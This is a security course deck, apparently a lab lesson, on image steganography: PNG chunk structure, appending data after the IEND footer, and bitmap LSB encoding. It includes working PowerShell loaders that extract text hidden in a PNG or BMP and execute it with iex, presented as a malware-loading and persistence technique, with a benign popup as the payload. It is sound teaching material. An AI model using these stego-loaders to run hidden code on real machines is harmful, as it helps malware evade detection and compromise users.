---
title: "47강_Steganography_v1.2"
type: "acs-advance-pdf"
course: "ACS Advanced"
course_folder: "Incident Response"
source_path: "E:\\ProJect\\ACS File\\advance\\Incident Response\\47강_Steganography_v1.2.pdf"
source_size_bytes: 821327
source_modified: 2025-11-12T13:47:51
imported_at: 2026-06-14T14:27:11
tags:
  - acs
  - acs-advanced
  - imported
---

# 47강_Steganography_v1.2

- Source: [47강_Steganography_v1.2.pdf](file:///E:/ProJect/ACS%20File/advance/Incident%20Response/47%EA%B0%95_Steganography_v1.2.pdf)

> Imported from PDF for Obsidian search. Verify formatting against the original file when exact layout matters.

## Page 1

Steganography
• What is Steganography?
• Footer
• LSB
• Infringement Continuation Techniques
47
1

## Page 2

What is Steganography?01
What is Steganography?
Meaning
Greek for "secret writing"
Method
Protect information and conceal its
existence by hiding it inside other data
Tips
• Steganographic methods conceal the very existence of a message
• A message can be concealed by utilizing the least significant bit (LSB) of a file or by
manipulating the LSB of each pixel in the RGB information of the pixels in an image file
2

## Page 3

• Steganography's greatest characteristic is its ability to hide the very existence of information
• It is effective not only in hiding information, but also in hiding the fact that information is hidden
Exam
• With encryption, information is encrypted so that no one can see it, but the encrypted data is still
recognized as encrypted, so there is a chance that someone could be interested in the data
• Steganography hides information inside other data, making it very difficult for someone to find or access
the information unless they know it is hidden
Exam2
• In fact, state spies have been known to use steganography to send and receive instructions, and the
famous 9/11 attacks were suspected of using steganography to send and receive instructions
Features
What is Steganography?01
3

## Page 4

Image Steganography
• Image steganography is a method of hiding secret information within
an image file
• It is the most common form of steganography, and is used in many
cases to create
LSB
• Changing the least significant bit of the bits that represent the value of
a pixel in an image
• Can hide information without significantly affecting the original image
Can be applied to a wide variety of media, including images, audio, video, etc.
Difficult to analyze even if you know how to do so, as each medium has different ways of analyzing and hiding things
Adaptable to a variety of media
1 0 0 0 0 0 0 1
MSB
LSB
Most Significant Bit
Least Significant Bit
What is Steganography?01
4

## Page 5

1
2
Footer Signature
Where the file ends
Utilization
This is especially useful when the file has a
certain size or format
Most programs that read files refer to the
file's header information to read the contents
of the fileThe header information defines the
file's type, size, structure, and so on, which
the program uses to parse the file
Footer Signature
What is Steganography?01
5

## Page 6

Exploit cases
Steganographically hiding secret information and
then publicly sharing or sending a file containing
that information to leak information or
communicate instructions to accomplish an
objective
Material leaks and directives delivery
• Propagating malicious code by hiding it with steganography
and then sharing or sending files containing the code can
bypass security systems that detect malware
• Difficult to detect with common malware detection tools or
methodologies
How it works
• Hackers use steganography to hide malicious code in a
common file
• Files containing hidden malicious code are sent in a variety of
ways, including email attachments, website downloads,
social media shares, etc.
• When someone opens that file, code that deciphers the
steganography is executed to extract and execute the
malicious code
Malware loading
Concealing illegal content by steganographically
hiding it and then sharing or sending files
containing it
Bypassing security systems that detect that content
Concealing illegal content
What is Steganography?01
6

## Page 7

Footer02
02
01
03
04
About PNG Structure
Signature
Chunk
Footer
Powershell Script
Make Execute Script
Make PNG File + add script
Make PNG File
Make Simple Script
PNG File + Script
Execute
Result
Uses
7

## Page 8

What is PNG
Features and configuration
• PNG uses lossless compression to store images, which allows it to preserve
high-resolution images and graphics while keeping the file size relatively small
• Supports transparency, which can be used to make transparent backgrounds
or parts of an image transparent
• Supports multiple color spaces, allowing for a wide range of color
representations
• PNGs are widely used in web pages, design work, graphic editing software,
etc.
Features
Portable Network Graphics
Pixel-based image file format
PNG
• The signature of a PNG file is a special sequence of bytes used to identify the
file as being in the PNG format
• The signature is located at the beginning of the PNG file and consists of 8
bytes
• The value of the signature is always 89 50 4E 47 0D 0A 1A 0A
• 50 4E 47 represents PNG in ASCII characters
Configuration - Signature
Footer02
8

## Page 9

Signature Size IHDR
Chunk
In PNG, chunks are IHDR, PLTE, IDAT, and IEND, each of which has its own role.
A chunk consists of 4 elements
• Chunk Size : 4byte
• Chunk Type : 4byte, IHDR, IDAT, IEND, etc.
• Chunk Data : Variable, contains real information
• CRC32 : 4byte , integrity guaranteed
IHDR
Horizontal, vertical, bit depth, color type,
compression, filter, interlacing, etc.
Component
Must appear after the signature
Features
Footer02
9

## Page 10

IDAT
Holds the actual image data and can have more than one
Each image line performs a filtering process
This process converts the pixel values of a line into
a difference to the pixel values of the line before it
Improves compression efficiency by better revealing
patterns in data
Filtering
The encoding process
Filtered data is compressed using the zlib data format
The zlib data format uses the DEFLATE compression algorithm
Lossless compression algorithm
All IDAT chunks in a PNG file contain parts of the same image data,
and they can be combined to get the complete image data
Compression
IEND
Indicates the end of the image data, and this chunk must be placed last
Has a value of 49 45 4E 44 AE 42 60 82
Footer02
10

## Page 11

a.png, a.bmp
Using Paint to Create PNG and Bitmap FilesSmaller
pictures are easier to work with
Bitmap files are used in the second lab
script.txt
Enter msg * this_is_in_PNGFILE
Footer02
11

## Page 12

copy /b a.png + script.txt add.png
Use the copy /b command to append a.png and script and save
as add.png
command
• Performs an action that copies a file in binary mode
• Means that the contents of the file are copied verbatim without changing
them
• Available in Command Prompt or PowerShell
• When you copy a file in binary mode, the contents of the original file and
the copy file match exactly
• Used for tasks such as backing up, cloning, and moving certain file types
copy /b
• We can see that the Size of a.png and script.txt is the same as
the Size of add.png because they are simply added together
• a.png : 558 bytes
• script.txt : 24bytes
• add.png : 582 bytes
Check Size
Footer02
12

## Page 13

Not visible to the eye
Compare images
Footer02
13

## Page 14

$bytes = [System.IO.File]::ReadAllBytes('C:\Users\ACS\Desktop\add.png')
$hexPattern = '49', '45', '4E', '44', 'AE', '42', '60', '82'
$patternIndex = -1
for ($i = 0; $i -lt $bytes.Length - $hexPattern.Length; $i++) {
    $match = $true
    for ($j = 0; $j -lt $hexPattern.Length; $j++) {
        if ($bytes[$i + $j] -ne [Convert]::ToInt32($hexPattern[$j], 16)) {
            $match = $false
            break
        }
    }
    if ($match) {
        $patternIndex = $i + $hexPattern.Length
        break
    }
}
if ($patternIndex -ne -1) {
    $selectedBytes = $bytes[$patternIndex..$bytes.Length]
    $ascii = [System.Text.Encoding]::ASCII.GetString($selectedBytes)
    iex $ascii
}
else {
    Write-Output "not exist file"
}
• Reads all bytes of a specified file and returns them as a byte array
• The ReadAllBytes method is primarily used when you need to read the contents of
a file byte by byte
• Read the contents of a specific file into a byte array, which can be used for other
operations
[System.IO.File]::ReadAllBytes
• $bytes: get the hex value of a.png
• $hexPattern: define the pattern, 49 45 4E 44 AE 42 60 82 is the Footer of png
• $patternIndex: initial pattern index
Variables
• If the current byte does not match the pattern, set $match to False and exit
the loop
• Back to the first for statement and set $match to True
• Passing that conditional statement means we found the footer
1st conditional statement
• If the current byte does not match the pattern, set $match to False and exit the loop
• Back to the first for statement and set $match to True
• Passing that conditional statement means we found the footer
2nd conditional statement
• If patternIndex is not -1, reads a length of $bytes from the value stored in
patternIndex and stores it in $selectedBytes, converts the stored value to an
ascii character and stores it in $ascii
• Execute the string stored in $ascii using iex
3rd conditional statement
Footer02
14

## Page 15

Verify that the values in script.txt are executed
Run Result
Footer02
15

## Page 16

LSB03
02
01
03
04
Bitmap Structure
Simple Bitmap Structure
Powershell Script
Encode Bitmap LSB
Decode Bitmap LSB
Bitmap LSB
How can we enforce LSB?
Execute
Run and check the results
16

## Page 17

a.bmp
a.bmp hex Bitmap Structure
Bitmap
Bitmap File Header (14 bytes)
Bitmap Info Header (40 bytes)
Image (Variable)
LSB03
17

## Page 18

FE = 1111 1110
Data
Exam
FF = 1111 1111
ACS = 0x41 0x43 0x53
=> 0100 0001 0100 0011 0101 0011
A = 0100 0001
=> FE FF FE FE FE FE FE FFLSB
Bin
LSB03
18

## Page 19

$path = 'C:\Users\ACS\desktop\a.bmp'
$bytes = [System.IO.File]::ReadAllBytes($path)
$message = 'msg * this_is_LSB'
$messageBytes = [System.Text.Encoding]::ASCII.GetBytes($message)
$start = 55
for ($i = 0; $i -lt $messageBytes.Length; $i++) {
    $byte = $messageBytes[$i]
    for ($j = 0; $j -lt 8; $j++) {
        $bit = ($byte -shr $j) -band 1
        $bytes[$start + $i * 8 + $j] = ($bytes[$start + $i * 8 + $j] -band 0xFE) -bor $bit
    }
}
[System.IO.File]::WriteAllBytes('C:\Users\ACS\desktop\dd.bmp', $bytes)
Encode LSB
Save the script to be executed in $message
Then convert the $message variable to ASCII bytes and store it in the $messageBytes variable
-shr : Shift Right
-band : BitWise AND
-bor : BitWise OR
When you finish the LSB process, save it to the path C:\Users\ACS\desktop\dd.bmp
LSB03
19

## Page 20

Almost impossible to see by eye
Compare images
LSB03
20

## Page 21

Infringement Continuation Techniques04
$path = 'C:\Users\ACS\desktop\dd.bmp'
$bytes = [System.IO.File]::ReadAllBytes($path)
$start = 55
$messageBytes = @()
#for ($i = 0; $i -lt $bytes.Length - $start; $i += 8) {
for ($i = 0; $i -lt 136; $i += 8) {
    $byte = 0
    for ($j = 0; $j -lt 8; $j++) {
        $bit = $bytes[$start + $i + $j] -band 1
        $byte = $byte -bor ($bit -shl $j)
    }
    $messageBytes += $byte
}
$message = [System.Text.Encoding]::ASCII.GetString($messageBytes)
Write-Output $message
iex $message
Decode LSB
Read all bytes from dd.bmp and perform LSB decoding starting at the 55th bytes
The for statement includes decoding the LSBs
Change the decoded value to an ASCII character using ASCII.GetString
Outputting the saved characters to a Powershell window and running it
Decode LSB
Output this_is_LSB and run a popup window when the script
runs
21

## Page 22

침해지속기법04
Source Apply LSB
For originals, you can see that they are all filled with FF
Source
For LSB applied bitmaps, Check that FF and FE are
combined
Apply LSB
In steganography, it is most common to use the least significant bit, but it is also possible to use higher ranked bits
When the 7th and 8th bits are used, it can be called 2-LSB steganography, which can hide more information than the LSB method
Because it alters more data, the difference from the original file may appear larger
Infringement Continuation Techniques
22
